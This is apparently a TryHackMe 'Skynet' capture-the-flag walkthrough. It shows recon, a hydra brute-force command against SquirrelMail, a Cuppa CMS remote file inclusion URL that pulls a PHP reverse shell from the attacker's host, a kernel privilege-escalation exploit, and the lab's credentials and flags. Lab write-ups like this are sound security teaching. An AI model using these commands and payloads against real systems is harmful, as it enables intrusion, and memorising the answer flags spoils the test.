---
title: 'Skynet — THM WriteUp'
date: 'Jun 10, 2024'
description: 'A vulnerable Terminator themed Linux machine.'
category: 'Walkthrough'
cover: 'https://i.postimg.cc/rm4knt3F/0-Vrpcqv833MHHSYsb.webp'
tags: [ 'Skynet', 'Thm', 'Pentesting', 'Writeup', 'Tryhackme' ]
---

## What is Miles password for his emails?

In the nmap scan we found the following ports:

```
$ sudo nmap -sCV -T4 -vvv 10.10.4.21 -p-
...
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

This is what we find when accessing the http server through port 80:

![](https://i.postimg.cc/yYvwTPxG/1-vt-CPrf-Ow7p-RNGDTyb6PGLQ.webp)

Using the dirsearch tool, we know that there are several internal pages but we cannot access them: /css, /config, /admin and /js. However, there is one that we can access: /squirrelmail:

![](https://i.postimg.cc/wvXrR5nF/1-RGQm12Zl-V8S0o-P-4Q-v-W3Q.webp)

As far as we can see, it is a SquirrelMail server with verison 1.4.23, which makes a lot of sense since on port 110 we found Dovecot pop3d.

Using the enum4linux command, we find that there is a share on the samba server that we can access:

```
enum4linux -a 10.10.4.21 
...
//10.10.4.21/anonymous Mapping: OK Listing: OK
```

![](https://i.postimg.cc/52XkSWZW/1-5rb-Ty2Q8L9TFRENez-C9Uzw.webp)

In addition, enum4linux reports some users:

![](https://i.postimg.cc/9Mh82Rzy/1-wa5Eeh-O1fz73n-YDcm-Fsndw.webp)

When entering the samba server, there is a file and a folder with logs that we are going to download. The files inside are:

![](https://i.postimg.cc/DzV5QJrt/1-Rhr1vwp-Pz-yp-V6HLy2GOnw.webp)

In the file attention.txt, we can read:

> A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.  - Miles Dyson

Log files 2 and 3 are empty, but log1.txt shows passwords or possible users of the system:

![](https://i.postimg.cc/YSwfLckk/1-OPj1Yh97P0t-QMPBZw-Pu-RDQ.webp)

After reading this, I intercepted the login request and used hydra to do a brute force attack using the user milesdyson:

```
POST /squirrelmail/src/redirect.php HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
...
login_username=USERNAME&secretkey=PASSWORD&js_autodetect_results=1&just_logged_in=1
```

```
└─$ hydra -l milesdyson -P log1.txt 10.10.4.21 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect" -I
...
[80][http-post-form] host: 10.10.4.21   login: milesdyson   password: cyborg007haloterminator
```

We already have the milesdyson email password:

**Q1**: milesdyson:cyborg007haloterminator

---

## What is the hidden directory?

When entering the mail, we will see the following subjet: “Samba Password reset”, it tells us that the smb password has been changed to )s{A&2Z=F^n_E.B`.

![](https://i.postimg.cc/Jh1HWRM8/1-Siif62c-Dce-VTCVn0OWPE-w.webp)

In this way, we will log in to smb with this user

```
smbclient //10.10.4.21/milesdyson -U milesdyson
```

When you enter smb, there is a folder notes, there is a file called important.txt with the following content:

> 1. Add features to beta CMS /45kra24zxs28v3yd
> 2. Work on T-800 Model 101 blueprints
> 3. Spend more time with my wife

**Q2**: /45kra24zxs28v3yd

---

## What is the vulnerability called when you can include a remote file for malicious purposes?

**Q3**: Remote file inclusion

---

## What is the user flag?

Going back to q2’s answer, searching with dirsearch I came across a page in /…/administrator with a cms called cuppa:

![](https://i.postimg.cc/VkzXzqFQ/1-dn-Tk9RFt-R9u-V4Nrc-GEky-Nw.webp)

I found the following [exploit in exploit-db](https://www.exploit-db.com/exploits/25971)

This one, it seems, exploits a php injection vulnerability. And from it, files can be read:

![](https://i.postimg.cc/g2MLdfJY/1-n-A6mh-ZUgf-IKn-U-k-Szb-NNWw.webp)

So I opened an http server where I had the PentestMonkey PHP Shell and entered it this way in the url:

```
IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.251.175/php-reverse-shell.php
```

![](https://i.postimg.cc/pVD9y9rM/1-Jo-It-OE-2Ph2B8Apj4Zx-ITA.webp)

**Q4**: 7ce5c2109a40f958099283600a9ae807

---

## What is the root flag?

I ran linpeas, and it reported that this [exploit](https://www.exploit-db.com/exploits/45010) was quite likely to work:

![](https://i.postimg.cc/02X9NxY9/1-e-H1GOWa-EYg6d-8Ce-SSE4p-A.webp)

So I downloaded it and compiled it, and when I ran it, it directly made me root user with maximum privileges:

![](https://i.postimg.cc/7Yhydcpp/1-Ihbe5s-Wp-JUJHG85p-Ap0o1g.webp)

**Q5**: 3f0372db24753accc7179a282cd6a949

---

![](https://i.postimg.cc/kMj0QsBb/1-h-Hcw-Q-4Ag-PWb54Nr-G7E-Ww.webp)

<3 Carlos